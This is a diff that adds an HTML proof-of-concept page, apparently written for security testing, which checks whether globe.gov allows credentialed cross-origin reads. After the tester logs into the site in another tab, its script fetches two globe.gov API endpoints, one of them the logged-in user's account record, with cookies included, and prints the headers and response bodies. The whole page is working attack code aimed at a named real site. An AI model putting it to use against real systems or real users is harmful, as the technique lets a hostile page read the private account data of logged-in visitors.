@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>GLOBE.gov CORS Test — serve over HTTP only</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 720px; margin: 40px auto; padding: 0 20px; }
+    .warn { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 8px; margin-bottom: 16px; }
+    pre { background: #f4f4f4; padding: 16px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    code { background: #eee; padding: 2px 6px; border-radius: 4px; }
+  </style>
+</head>
+<body>
+  <h1>GLOBE.gov CORS test</h1>
+
+  <div class="warn">
+    <strong>Do not open this file directly (file://).</strong><br>
+    Run: <code>python3 -m http.server 8080</code> then open
+    <code>http://127.0.0.1:8080/cors_poc.html</code><br>
+    Log into <a href="https://www.globe.gov" target="_blank">globe.gov</a> in another tab first.
+  </div>
+
+  <p>Current origin: <strong id="origin"></strong></p>
+  <button onclick="test()">Test CORS</button>
+  <pre id="out">Click Test after serving this page over HTTP.</pre>
+
+  <script>
+    document.getElementById("origin").textContent = window.location.origin;
+
+    async function test() {
+      const out = document.getElementById("out");
+      if (window.location.protocol === "file:") {
+        out.textContent = "ERROR: You opened file:// — Origin is null. Use http://127.0.0.1:8080/cors_poc.html";
+        return;
+      }
+
+      const endpoints = [
+        "https://www.globe.gov/api/jsonws/",
+        "https://www.globe.gov/o/headless-admin-user/v1.0/my-user-account",
+      ];
+
+      let result = `Origin: ${window.location.origin}\n\n`;
+
+      for (const url of endpoints) {
+        result += `--- ${url} ---\n`;
+        try {
+          const r = await fetch(url, { credentials: "include", mode: "cors" });
+          const text = await r.text();
+          result += `SUCCESS (browser allowed read)\nStatus: ${r.status}\n`;
+          result += `ACAO: ${r.headers.get("access-control-allow-origin")}\n`;
+          result += `Body: ${text.slice(0, 500)}\n\n`;
+        } catch (e) {
+          result += `BLOCKED: ${e.message}\n\n`;
+        }
+      }
+
+      result += `\nIf you see "multiple values '*, ...'" the server CORS is malformed and NOT exploitable.`;
+      out.textContent = result;
+    }
+  </script>
+</body>
+</html>
